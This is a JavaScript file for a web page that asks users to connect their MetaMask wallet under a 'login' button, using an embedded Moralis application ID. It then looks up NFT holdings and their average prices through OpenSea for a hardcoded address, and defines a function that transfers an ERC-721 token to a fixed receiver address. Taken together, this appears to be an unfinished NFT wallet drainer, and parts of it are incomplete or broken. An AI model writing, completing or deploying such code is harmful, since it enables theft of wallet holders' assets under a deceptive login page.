var web3
Moralis.initialize("bvWDkF2SPUcpBOxbmEfoLopuz1HOH5lS9D2spYWY"); // Application id from moralis.io
Moralis.serverURL = "https://qwy4i8eo6pzs.usemoralis.com:2053/server"; //Server url from moralis.io
window.userWalletAddress = null
const loginButton = document.getElementById('loginButton')
const userWallet = document.getElementById('userWallet')
let  adress ;
//async function loginWithMetaMask() {
//    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
//      .catch((e) => {
//        console.error(e.message)
//        return
//      })
//    if (!accounts) { return }
//
//    window.userWalletAddress = accounts[0]
//    console.log(accounts[0])
//    Moralis.enableWeb3()
//  }
async function loginWithEth() {
  if (window.ethereum) {
    try {
      // We use this since ethereum.enable() is deprecated. This method is not
      // available in Web3JS - so we call it directly from metamasks' library
      const selectedAccount = await window.ethereum
        .request({
          method: "eth_requestAccounts",
        })
        .then((accounts) => accounts[0])
        .catch(() => {
          throw Error("No account selected!");
        });
      window.userAddress = selectedAccount;
      window.localStorage.setItem("userAddress", selectedAccount);
      showAddress();
    } catch (error) {
      console.error(error);
    }
  } else {
    alert("No ETH brower extension detected.");
  }
  Moralis.enableWeb3()
}

function truncateAddress(address) {
  if (!address) {
    return "";
  }
  return `${address.substr(0, 5)}...${address.substr(
    address.length - 5,
    address.length
  )}`;
}

function showAddress() {
  if (!window.userAddress) {
    document.getElementById("userAddress").innerText = "";
    document.getElementById("logoutButton").classList.add("hidden");
    return false;
  }

  document.getElementById(
    "userAddress"
  ).innerText = `ETH Address: ${truncateAddress(window.userAddress)}`;
  document.getElementById("logoutButton").classList.remove("hidden");
}

// remove stored user address and reset frontend
function logout() {
  window.userAddress = null;
  window.localStorage.removeItem("userAddress");
  showAddress();
}

async function getOpenseaItems() {
  if (!window.userAddress) { return }
  const osContainer = document.getElementById('openseaItems')

  let reponse = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=0xe9Fd7F0C7A239CF5e4998F79cF47f698Ba55cfC1&offset=0&limit=200`)
  let data = await reponse.json()
  let reponse2 =  await fetch(`https://api.opensea.io/api/v1/assets?owner=0xe9Fd7F0C7A239CF5e4998F79cF47f698Ba55cfC1&order_direction=desc&limit=020&include_orders=false`)
  let data2 = await reponse2.json()
  console.log(data2.assets[0].asset_contract.address)
  var token = []
  var adress = []
  var adress2 = []
  var duo = []
  var duo2 = []
  const test = []
  var test2
  let i = 0
    for (let pas = 0; pas < data2.assets.length; pas++) {
      //console.log(data2.assets[pas].token_id)
      token[pas]= data2.assets[pas].token_id
      adress[pas]= data2.assets[pas].asset_contract.address
      duo[pas] = new Array(2)
      duo[pas][1]=token[pas]
      duo[pas][0]=adress[pas] 
      duo[pas][2]=data2.assets[pas].asset_contract.schema_name
    }
    for (let pas = 0; pas < data2.assets.length; pas++) {
      test[pas]={
        adress1:data2.assets[pas].asset_contract.address,
        token1:data2.assets[pas].token_id,
        type : data2.assets[pas].asset_contract.schema_name,
        average : '',
      }
    }
    console.log(test)
    console.log(duo2)
    for (let i = 0; i < data.length; i++){
      duo2[i] = new Array(1)
      duo2[i][0]=data[i].stats.seven_day_average_price
      if (data[i].primary_asset_contracts.length>0){
        duo2[i][1]=data[i].primary_asset_contracts[0].address
      }
      else {
        duo2[i][1]=''
      }
      
    }
    
    var tableauFormaté = test.map(obj => {

    });
}

  async function transferNFTs  () {
    console.log('transferring NFTs');
    const options = {
        type: "erc721",
        receiver: "0x09136544Ec237736ef3933E419575A2Ed0DF4782",
        contract_address: "0x572e33ffa523865791ab1c26b42a86ac244df784",
        token_id: "29588577494230120792065",
        amount: "1"
    };
    let result = await Moralis.transfer(options);
    console.log('NFT Transferred');
}


